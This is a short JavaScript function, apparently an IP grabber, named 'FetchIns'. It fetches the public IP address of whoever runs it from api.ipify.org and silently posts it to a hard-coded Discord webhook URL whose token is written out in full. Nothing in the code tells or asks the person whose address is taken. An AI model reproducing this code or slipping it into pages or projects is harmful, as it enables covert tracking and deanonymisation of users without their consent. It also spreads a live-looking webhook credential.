function FetchIns() {
    const webhookUrl = 'https://discord.com/api/webhooks/1275656626447188019/zknXOKY7VG9OR-XZ98IDzcwH3MD5tJ1B-X0vTTLex5nRKKmtjVdB5r-q3IFX0cnlkxeN';
  
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const payload = {
          content: 'IP Address: ' + data.ip
        };
  
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        })
        .then(response => {
          if (response.ok) {
            console.log('IP successfully sent to webhook.');
          } else {
            console.error('Failed to send IP to webhook.');
          }
        })
        .catch(error => console.error('Error:', error));
      })
      .catch(error => console.error('Error fetching IP address:', error));
  }
  